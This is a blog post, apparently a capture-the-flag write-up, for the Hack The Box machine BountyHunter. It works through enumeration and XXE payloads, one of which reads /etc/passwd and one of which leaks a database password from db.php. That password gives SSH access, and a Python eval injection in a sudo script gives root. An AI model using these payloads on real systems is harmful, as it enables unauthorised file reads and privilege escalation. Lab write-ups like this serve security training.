---
layout: post
title: "HTB: BountyHunter"
author: Andrew Cherney
date: 2023-02-04 12:38:51
tags: htb easy-box linux webapp xxe python sudo
icon: "/assets/icons/bountyhunter.png"
post_description: "User for this box incorporates XML XXE in a bug reporting forum and using that exploit to read a discovered database. Root is obtained through a python sandbox escape from a custom script with NOPASSWD sudo access."
---

<h1>Summary</h1>

User for this box incorporates XML XXE in a bug reporting forum and using that exploit to read a discovered database. Root is obtained through a python sandbox escape from a custom script with NOPASSWD sudo access.    

<h1>Enumeration</h1>

<h2>nmap</h2>

```bash
nmap 10.10.11.100 -sC
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 21:13 CST
Nmap scan report for 10.10.11.100
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http
|_http-title: Bounty Hunters

Nmap done: 1 IP address (1 host up) scanned in 18.43 seconds
```

<h2>Port 80 - http</h2>

![Front Page](/img/bountyhunter/BountyHunter_Site_Front.png)

![Contact Us](/img/bountyhunter/BountyHunter_Site_Front_Contact.png)

Okay so there's some input fields for contact information. I'll throw a swiss army knife at it and see if anything sticks. 

![Contact Payload](/img/bountyhunter/BountyHunter_Site_Contact_Fuzz.png)

No payload returns anything. Better keep looking towards the top **PORTAL** page which is the only place on the page which leads to a different one. That brings us to a redirect to a **log_submit.php** file where bugs are reported.

![Portal Redirect](/img/bountyhunter/BountyHunter_Site_Portal_redirect.png)

![Bug Report](/img/bountyhunter/BountyHunter_Site_Portal_BugReport.png)

<h2>Burp Suite</h2>

I'll start by intercepting a random bug report and see how this php file handles the data. 

![Bug Burp Intercept](/img/bountyhunter/BountyHunter_Burp_Bug_Report_data.png)

That data is url encoded base64, which once I decode is an xml document containing the fields I entered. Another nice touch I didn't realize until review of this solution was the POST request is for **/tracker_diRbPr00f314\.php** so the php file was unlikely to be found manually. 

![Burp XML](/img/bountyhunter/BountyHunter_Burp_XML.png)

<h1>User as development</h1>

<h2>XXE</h2>

I'll throw a test payload to read **/etc/passwd** since the users on the machine might be needed at some point.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY raccoon SYSTEM "/etc/passwd"> ]>
		<bugreport>
		<title>&raccoon;</title>
		<cwe>&raccoon;</cwe>
		<cvss>&raccoon;</cvss>
		<reward>&raccoon;</reward>
		</bugreport>
```

```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4NCjwhRE9DVFlQRSBmb28gWzwhRU5USVRZIHJhY2Nvb24gU1lTVEVNICIvZXRjL3Bhc3N3ZCI%2bIF0%2bDQoJCTxidWdyZXBvcnQ%2bDQoJCTx0aXRsZT4mcmFjY29vbjs8L3RpdGxlPg0KCQk8Y3dlPiZyYWNjb29uOzwvY3dlPg0KCQk8Y3Zzcz4mcmFjY29vbjs8L2N2c3M%2bDQoJCTxyZXdhcmQ%2bJnJhY2Nvb247PC9yZXdhcmQ%2bDQoJCTwvYnVncmVwb3J0Pg%3d%3d
```

![/etc/passwd read xxe](/img/bountyhunter/BountyHunter_xxe_passwd_read.png)

The bug reporting system might be vulnerable to XXE, but that alone does not allow me to gain access. In the machine I am certainly the user www-data: a user designed to isolate site permissions from user permissions/directories. I need to find some sort of php file or database within the site directory to read and hope there is some key or credential I can use for further access. 

<h2>dirb</h2>

From here the best case is to find other php files and directories and snoop around with my new found local file read bug bounty reporting system. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/BountyHunter]
└──╼ $dirb http://10.10.11.100/ /opt/wordlists/seclists/Discovery/Web-Content/common.txt -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb  7 22:02:38 2023
URL_BASE: http://10.10.11.100/
WORDLIST_FILES: /opt/wordlists/seclists/Discovery/Web-Content/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4710                                                          

---- Scanning URL: http://10.10.11.100/ ----
+ http://10.10.11.100/db.php (CODE:200|SIZE:0)                                             
+ http://10.10.11.100/index.php (CODE:200|SIZE:25169)                                      
+ http://10.10.11.100/portal.php (CODE:200|SIZE:125)                                       
                                                                                           
-----------------
END_TIME: Tue Feb  7 22:07:00 2023
DOWNLOADED: 4710 - FOUND: 3
```

<h2>XXE PHP Filters</h2>

Well <code>db.php</code> seems like our winner for what we want to read. I will need to modify my payload to use php filters to read the php file and not require I know the directories above it. 

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY raccoon SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
		<bugreport>
		<title>&raccoon;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>
```

```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4NCjwhRE9DVFlQRSBmb28gWyA8IUVMRU1FTlQgZm9vIEFOWSA%2bDQo8IUVOVElUWSByYWNjb29uIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1kYi5waHAiID5dPg0KCQk8YnVncmVwb3J0Pg0KCQk8dGl0bGU%2bJnJhY2Nvb247PC90aXRsZT4NCgkJPGN3ZT48L2N3ZT4NCgkJPGN2c3M%2bPC9jdnNzPg0KCQk8cmV3YXJkPjwvcmV3YXJkPg0KCQk8L2J1Z3JlcG9ydD4%3d
```

When I send the payload I get back the decoded information: 

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

<h2>SSH</h2>

From my **/etc/passwd** file read test I know development has a home directory and I could try this password with their account.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/BountyHunter]
└──╼ $ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 09 Feb 2023 01:11:00 AM UTC

  System load:           0.09
  Usage of /:            24.3% of 6.83GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2457


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ 
```

<h1>Root</h1>

<h2>Sudo permissions</h2>

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

<h2>Code reading</h2>

I have sudo permissions with a specific Python script. I'll mark important parts with **>>** to break down what this script does. In addition in the directory of the script there are invalid tickets that I can use as a baseline.

```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

>> 0
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
	
>> 1    if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
	
>> 2    if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue
	
>> 3    if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
	
>> 4a   if code_line and i == code_line:
            if not x.startswith("**"):
                return False
		
>> 4b       ticketCode = x.replace("**", "").split("+")[0]
		
>> 4c       if int(ticketCode) % 7 == 4:
>> 4d           validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

*	0   >> Open a file with the extension .md
*	1   >> First line of the file needs to be **# Skytrain Inc**
*	2   >> Second line needs to start with **## Ticket to** followed by some string
*	3   >> Third line is only **__Ticket Code:__**
*	4a  >> Fourth line begins and ends with **
*	4b  >> Fourth line contains at least two numbers separated by **+**
*	4c  >> First number of that series must have a remainder of 4 after modulo 7
*	4d  >> Checks if the next number is over 100 with eval

<br>
We'll start by making a ticket to see if I understand how to pass through the script, specifically to that eval function.

```
# Skytrain Inc
## Ticket to Trashtown
__Ticket Code:__
**11+101+0**
```

```bash
development@bountyhunter:~$ nano trash.md 
development@bountyhunter:~$ python3 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
./trash.md
Destination: Trashtown
Valid ticket.
```

<h2>Python Sandbox Escape</h2>

Excellent, now for our exploit. That eval function can be used to run python code from the script, and since we can run it with sudo we can get a root shell with it. I'll try to use **whoami** as a test to confirm my suspicions and create a proof of concept that I can change. 

```
# Skytrain Inc
## Ticket to Trashtown
__Ticket Code:__
**11+__import__('os').system('whoami')+0**
```

```bash
development@bountyhunter:~$ sudo python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
./eval.md
Destination: Trashtown
root
Invalid ticket.
```

The reason this allows us to run any command we effectively want is an unsanitized use of eval marked by my 4d on the code. When eval is determining what to add (or concatenate) to the first number provided it will evaluate the expression, which imports os and uses the system module to run commands as the user running the process. From here I can change the **whoami** to **/bin/bash -p** and gain a root shell after running the python script once more. 

```bash
development@bountyhunter:~$ sudo python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
./eval.md
Destination: Trashtown
root@bountyhunter:/home/development#
```

<h2>Root Flag</h2>

```bash
root@bountyhunter:/home/development# cat /root/root.txt 
9536f2af3aa414f8-------------
```

